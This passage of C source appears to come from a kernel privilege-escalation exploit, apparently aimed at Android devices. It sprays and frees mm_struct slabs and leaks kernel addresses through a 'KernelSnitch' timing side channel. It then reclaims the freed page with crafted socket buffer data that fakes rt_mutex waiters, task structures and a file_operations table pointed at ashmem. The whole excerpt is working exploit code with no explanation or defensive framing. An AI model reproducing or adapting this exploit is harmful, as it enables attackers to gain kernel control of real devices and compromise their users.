        if (size >= sizeof(exact_free_line)) {
          size = sizeof(exact_free_line) - 1;
        }
        memcpy(exact_free_line, line, size);
      }
    } else {
      exact_alloc++;
      if (saw_exact_free) {
        exact_alloc_after_free++;
        exact_alloc_cpu = cpu;
        if (strstr(event, "GFP_NOWAIT") && strstr(event, "__GFP_COMP")) {
          exact_skb_alloc_after_free++;
        }
        if (!exact_alloc_line[0]) {
          size_t size = strcspn(line, "\r\n");
          if (size >= sizeof(exact_alloc_line)) {
            size = sizeof(exact_alloc_line) - 1;
          }
          memcpy(exact_alloc_line, line, size);
        }
      }
    }
  }
  int read_error = ferror(fp);
  int saved_errno = errno;
  free(line);
  if (fclose(fp) != 0) {
    pr_warning("reclaim tracefs read close failed errno=%d\n", errno);
    controls_ok = 0;
  }
  pr_info("reclaim tracefs result pfn=0x%llx free=%zu alloc=%zu alloc_after_free=%zu skb_alloc_after_free=%zu free_cpu=%d alloc_cpu=%d order3_free=%zu order3_alloc=%zu lines=%zu parse_fail=%zu controls=%d\n",
          gate->pfn, exact_free, exact_alloc, exact_alloc_after_free,
          exact_skb_alloc_after_free, exact_free_cpu, exact_alloc_cpu,
          order3_free, order3_alloc, lines, parse_fail, controls_ok);
  if (exact_free_line[0]) {
    pr_info("reclaim tracefs exact free %s\n", exact_free_line);
  }
  if (exact_alloc_line[0]) {
    pr_info("reclaim tracefs exact alloc %s\n", exact_alloc_line);
  }
  if (read_error) {
    pr_warning("reclaim tracefs read failed errno=%d\n", saved_errno);
    return 0;
  }
  if (!controls_ok || parse_fail || exact_free != 1 ||
      exact_alloc_after_free < 1 || exact_skb_alloc_after_free < 1 ||
      exact_free_cpu != CORE || exact_alloc_cpu != CORE) {
    pr_warning("reclaim tracefs gate failed pfn=0x%llx\n", gate->pfn);
    return 0;
  }
  pr_success("reclaim tracefs gate ok pfn=0x%llx\n", gate->pfn);
  return 1;
}
#endif

#endif

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    slide_bank_payload_base = payload_base;
    for (size_t chunk = 0;
         chunk + SKB_FRAG_BIAS + ORDER3_SIZE <= SKB_SEND_SIZE;
         chunk += ORDER3_SIZE) {
      unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
      memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
      for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
        uintptr_t parent;
        uintptr_t target;
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
        if (slot == P0_ORACLE_GATE_SLOT) {
          parent = direct_to_page(base);
          target = pipebuf_page_base +
                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
          p0_gate_page_struct = parent;
        } else if (slot == P0_ORACLE_PROBE_SLOT) {
          uintptr_t direct_addr =
              P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) +
              P0_ORACLE_PROBE_OFFSET;
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
          if (p0_virtual_base_probe) {
            direct_addr = data_addr(ASHMEM_MISC_FOPS);
          }
#endif
          parent = direct_to_page(direct_addr);
          target = pipebuf_page_base +
                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
                   sizeof(struct user_pipe_buffer);
          p0_probe_page_struct = parent;
        } else if (slot == P0_ORACLE_GATE_RESTORE_SLOT) {
          parent = p0_gate_page_struct;
          target = 0;
        } else {
          parent = p0_probe_page_struct;
          target = 0;
        }
#else
        uintptr_t offset = slide_bank_offsets[slot];
        parent = SLIDE_NFULNL_LOGGER_OBJECT + offset;
        target = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + offset;
#endif
        slide_bank_parents[slot] = parent;
        slide_bank_targets[slot] = target;
        size_t task_off = SLIDE_BANK_TASK_OFF +
                          slot * SLIDE_BANK_TASK_STRIDE;
        size_t lock_off = SLIDE_BANK_LOCK_OFF +
                          slot * SLIDE_BANK_SLOT_STRIDE;
        size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
        uintptr_t task = payload_base + task_off;
        uintptr_t lock = payload_base + lock_off;
        uintptr_t waiter = payload_base + waiter_off;

        put32(p, lock_off + 0x00, 0);
        put64(p, lock_off + 0x08, waiter);
        put64(p, lock_off + 0x10, waiter);
        put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);

        put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
                        lock, SLIDE_FAKE_WAITER_PRIO);

        put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
        put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
        put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
        put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, 0);
        put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
        put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
        put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
      }
    }
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    return select_slide_payload_index(P0_ORACLE_GATE_SLOT);
#else
    return select_slide_payload_slot(slide_bank_offsets[0]);
#endif
  }
#endif

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
#if !defined(APP_CLOSED_FOPS_ROUTE) || !APP_CLOSED_FOPS_ROUTE
    slide_bank_payload_base = payload_base;
#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
    p0_gate_page_struct = direct_to_page(base);
    slide_bank_parents[P0_ORACLE_GATE_SLOT] = p0_gate_page_struct;
    slide_bank_targets[P0_ORACLE_GATE_SLOT] =
        pipebuf_page_base +
        P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
    slide_bank_parents[P0_ORACLE_PROBE_SLOT] = p0_gate_page_struct;
    slide_bank_targets[P0_ORACLE_PROBE_SLOT] = 0;
#elif defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
    APP_FOPS_DATA_ALIAS_DIAG_ONLY
    if (fops_data_probe_active) {
      p0_gate_page_struct = direct_to_page(base);
      p0_probe_page_struct =
          direct_to_page(fops_data_probe_addr & ~(PAGE_SIZE - 1));
      slide_bank_parents[P0_ORACLE_GATE_SLOT] = p0_gate_page_struct;
      slide_bank_targets[P0_ORACLE_GATE_SLOT] =
          pipebuf_page_base +
          P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
      slide_bank_parents[P0_ORACLE_PROBE_SLOT] = p0_probe_page_struct;
      slide_bank_targets[P0_ORACLE_PROBE_SLOT] =
          pipebuf_page_base +
          P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
          sizeof(struct user_pipe_buffer);
      slide_bank_parents[P0_ORACLE_GATE_RESTORE_SLOT] =
          p0_gate_page_struct;
      slide_bank_targets[P0_ORACLE_GATE_RESTORE_SLOT] = 0;
      slide_bank_parents[P0_ORACLE_PROBE_RESTORE_SLOT] =
          p0_probe_page_struct;
      slide_bank_targets[P0_ORACLE_PROBE_RESTORE_SLOT] = 0;
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
      slide_bank_parents[P0_ORACLE_PRODUCTION_SLOT] = fake_fops;
      slide_bank_targets[P0_ORACLE_PRODUCTION_SLOT] =
          data_addr(ASHMEM_MISC_FOPS);
#endif
    } else {
      slide_bank_parents[0] = fake_fops;
      slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
    }
#else
    slide_bank_parents[0] = fake_fops;
    slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
#endif
#else
    slide_oracle_parent = fake_fops;
    slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
#endif
  }
#endif
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    fake_parent = fake_fops;
    fake_right = data_addr(ASHMEM_MISC_FOPS);
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

#ifdef SLIDE_RECLAIM_SCAN_PHASE
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    for (size_t chunk = 0; chunk + ORDER3_SIZE <= SKB_SEND_SIZE;
         chunk += ORDER3_SIZE) {
      unsigned char *p = skb_buf + chunk;
      for (size_t off = SLIDE_RECLAIM_SCAN_PHASE;
           off + 0x20 <= ORDER3_SIZE; off += 0x20) {
        put64(p, off + 0x08, 0x4141000000000000ULL | off);
      }
    }
    return 1;
  }
#endif

  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
  uintptr_t write_left = 0;
  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  uint32_t waiter_prio = FAKE_WAITER_PRIO;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
    write_right = 0;
    write_left = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
    waiter_task = fake_task;
    task_group = 0;
    pi_top_task = fake_task;
#else
    waiter_task = SLIDE_INIT_TASK + slide_p0_offset;
    task_group = SLIDE_ROOT_TASK_GROUP + slide_p0_offset;
    pi_top_task = SLIDE_INIT_TASK + slide_p0_offset;
#endif
    waiter_prio = SLIDE_FAKE_WAITER_PRIO;
  }

  for (size_t chunk = 0;
       chunk + SKB_FRAG_BIAS + ORDER3_SIZE <= SKB_SEND_SIZE;
       chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, SLIDE_LOCK_OWNER_VALUE);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

    put_fake_waiter(p, W0_OFF, 1, 0, 0, write_pc, write_right, write_left,
                    waiter_task, fake_lock, waiter_prio);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_FOPS_TABLE_MIRROR_OFF)
      /*
       * Hardware reads the marker emitted at payload offset 0xe80 at page
       * offset zero, while the stable PI geometry deliberately addresses the
       * reclaimed payload with SKB_DATA_DELTA=-0x1000.  Keep that proven
       * geometry and mirror only the file_operations bytes across the 0x180
       * gap.  The primary copy remains for the page-aligned interpretation.
       */
      put_fake_fops_table(p, APP_FOPS_TABLE_MIRROR_OFF);
#endif
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE && \
    (!defined(APP_CLOSED_FOPS_ROUTE) || !APP_CLOSED_FOPS_ROUTE)
#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
      memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
      put_slide_bank_entry(
          p, payload_base, P0_ORACLE_GATE_SLOT,
          slide_bank_parents[P0_ORACLE_GATE_SLOT],
          slide_bank_targets[P0_ORACLE_GATE_SLOT]);
      put_slide_bank_entry(
          p, payload_base, P0_ORACLE_PROBE_SLOT,
          slide_bank_parents[P0_ORACLE_PROBE_SLOT],
          slide_bank_targets[P0_ORACLE_PROBE_SLOT]);
#elif defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
    APP_FOPS_DATA_ALIAS_DIAG_ONLY
      if (fops_data_probe_active) {
        memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
        for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
          put_slide_bank_entry(p, payload_base, slot,
                               slide_bank_parents[slot],
                               slide_bank_targets[slot]);
        }
      } else {
        put_slide_bank_entry(p, payload_base, 0,
                             slide_bank_parents[0],
                             slide_bank_targets[0]);
      }
#else
      put_slide_bank_entry(p, payload_base, 0,
                           slide_bank_parents[0],
                           slide_bank_targets[0]);
#endif
#endif
    }
  }
  return 1;
}

#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  int *target_fds;
  int shaping_sv[2] = {-1, -1};
  uintptr_t base = 0;
  int sndbuf = S918_SKB_SNDBUF;
  struct iovec iov;
  struct msghdr msg;
  struct controlled_mm_drain_state drain_state = {
      .s2 = -1,
  };
#if defined(APP_RECLAIM_TRACEFS_GATE) && APP_RECLAIM_TRACEFS_GATE
  struct reclaim_tracefs_gate trace_gate;
#endif

  close_reclaim_sockets();
  cleanup_page_prepare_state();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  skb_buf = malloc(SKB_SEND_SIZE);
  target_fds = calloc(mm_objs_per_slab, sizeof(*target_fds));
  if (!skb_buf || !target_fds) {
    errno = ENOMEM;
    SYSCHK(-1);
  }

  if (!collect_controlled_mm_group((size_t)cpu_count, &base, target_fds)) {
    free(target_fds);
    return 0;
  }
  pr_info("controlled mm group selected base=%016zx mode=%d\n",
          base, payload_mode);
  if (!prepare_skb_payload(base, payload_mode)) {
    for (size_t i = 0; i < mm_objs_per_slab; ++i) {
      if (target_fds[i] >= 0) {
        SYSCHK(close(target_fds[i]));
      }
    }
    free(target_fds);
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  SYSCHK(setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF,
                    &sndbuf, sizeof(sndbuf)));
  int flags = SYSCHK(fcntl(reclaim_sv[0], F_GETFL, 0));
  SYSCHK(fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK));
  for (size_t pair = 0; pair + 1 < S918_RECLAIM_SOCKET_PAIRS; ++pair) {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0,
                      controlled_reclaim_sv[pair]));
    controlled_reclaim_count++;
    SYSCHK(setsockopt(controlled_reclaim_sv[pair][0], SOL_SOCKET,
                      SO_SNDBUF, &sndbuf, sizeof(sndbuf)));
    flags = SYSCHK(fcntl(controlled_reclaim_sv[pair][0], F_GETFL, 0));
    SYSCHK(fcntl(controlled_reclaim_sv[pair][0], F_SETFL,
                 flags | O_NONBLOCK));
  }

  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, shaping_sv));
  ssize_t shaped = sendmsg(shaping_sv[0], &msg, 0);
  if (shaped != (ssize_t)SKB_SEND_SIZE) {
    if (shaped >= 0) {
      errno = EIO;
    }
    SYSCHK(-1);
  }
  pr_info("controlled skb shape sent bytes=%zd cpu=%d\n",
          shaped, sched_getcpu());

#if defined(APP_RECLAIM_TRACEFS_GATE) && APP_RECLAIM_TRACEFS_GATE
  if (!reclaim_tracefs_start(base, &trace_gate)) {
    for (size_t i = 0; i < mm_objs_per_slab; ++i) {
      if (target_fds[i] >= 0) {
        SYSCHK(close(target_fds[i]));
      }
    }
    free(target_fds);
    close_reclaim_sockets();
    return 0;
  }
#endif

  if (!drain_controlled_mm_group(target_fds, &drain_state, shaping_sv)) {
    free(target_fds);
    return 0;
  }

  int sent_count = 0;
  int stop_errno = 0;
  for (size_t pair = 0; pair < S918_RECLAIM_SOCKET_PAIRS; ++pair) {
    int sender = pair ? controlled_reclaim_sv[pair - 1][0] : reclaim_sv[0];
    for (int send_index = 0; send_index < S918_SKB_SENDS; ++send_index) {
      errno = 0;
      ssize_t sent = sendmsg(sender, &msg, MSG_DONTWAIT);
      if (sent != (ssize_t)SKB_SEND_SIZE) {
        stop_errno = errno;
        break;
      }
      sent_count++;
    }
  }
#if defined(APP_RECLAIM_TRACEFS_GATE) && APP_RECLAIM_TRACEFS_GATE
  int trace_ok = reclaim_tracefs_finish(&trace_gate);
#endif
  release_controlled_mm_drain(&drain_state);
  free(target_fds);
  pr_info("controlled skb reclaim sends=%d pairs=%d per_pair=%d stop_errno=%d base=%016zx mode=%d\n",
          sent_count, S918_RECLAIM_SOCKET_PAIRS, S918_SKB_SENDS,
          stop_errno, base, payload_mode);
#if defined(APP_RECLAIM_TRACEFS_GATE) && APP_RECLAIM_TRACEFS_GATE
  if (!trace_ok) {
    close_reclaim_sockets();
    return 0;
  }
#endif
  return sent_count ? base : 0;
}
#endif

#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
static void cleanup_failed_kernel_page(const char *reason) {
  pr_info("kernel page cleanup failure=%s stage=kernelsnitch begin\n", reason);
  kernelsnitch_cleanup(ks);
  ks = NULL;
  pr_info("kernel page cleanup failure=%s stage=kernelsnitch done\n", reason);
  pr_info("kernel page cleanup failure=%s stage=prepare-children begin count=%zu\n",
          reason, prepare_ctx.mm_cnt);
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    kill_child(prepare_ctx.childs[i]);
  }
  pr_info("kernel page cleanup failure=%s stage=prepare-children done\n", reason);
  cleanup_page_prepare_state();
}
#endif

uintptr_t prepare_kernel_page(int payload_mode) {
#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
  return prepare_controlled_kernel_page(payload_mode);
#else
  close_reclaim_sockets();
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  cleanup_page_prepare_state();
#endif
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
  }
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
    defined(APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
  size_t search_min_object_index = APP_FOPS_MIN_OBJECT_INDEX;
  size_t search_max_object_index = mm_objs_per_slab - 1;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    search_min_object_index = APP_SLIDE_MIN_OBJECT_INDEX;
    search_max_object_index = APP_SLIDE_MAX_OBJECT_INDEX;
  }
  kernelsnitch_set_search_bounds(
      ks, KERNELSNITCH_IDENTITY_START,
      APP_KERNEL_PAGE_KSNITCH_IDENTITY_END,
      search_min_object_index, search_max_object_index,
      APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
#endif
  configure_kernelsnitch_profile(ks, payload_mode);
#else
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    kernelsnitch_set_profile(
        ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
        SLIDE_KSNITCH_REPEAT_MEASUREMENT,
        SLIDE_KSNITCH_AVERAGE);
  }
#endif
#endif

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
    pre_ctx.childs[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
    post_ctx.childs[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
    spray_ctx.childs[i] = -1;
  }
  SYSCHK(waitpid(child_leak, NULL, 0));
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  log_mm_slabinfo("after-child-exit");
#endif

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("collision");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("mm-leak");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  leaked = canonicalize_kernelsnitch_pointer(leaked);
  log_mm_slabinfo("after-leak");
#endif

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  size_t object_index = (leaked - base) / MM_STRUCT_SZ;
  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
          leaked, base, object_index);
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_RECLAIM_MAX_DIRECT_BASE)
  if (base >= APP_RECLAIM_MAX_DIRECT_BASE) {
    pr_warning("mm reclaim candidate rejected mode=%d base=%016zx max=%016llx\n",
               payload_mode, base,
               (unsigned long long)APP_RECLAIM_MAX_DIRECT_BASE);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_SLIDE_MIN_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
      object_index < APP_SLIDE_MIN_OBJECT_INDEX) {
    pr_warning("mm slide candidate rejected object_index=%zu min=%d\n",
               object_index, APP_SLIDE_MIN_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_SLIDE_MAX_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
      object_index > APP_SLIDE_MAX_OBJECT_INDEX) {
    pr_warning("mm slide candidate rejected object_index=%zu max=%d\n",
               object_index, APP_SLIDE_MAX_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_FOPS_MIN_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_FOPS &&
      object_index < APP_FOPS_MIN_OBJECT_INDEX) {
    pr_warning("mm fops candidate rejected object_index=%zu min=%d\n",
               object_index, APP_FOPS_MIN_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
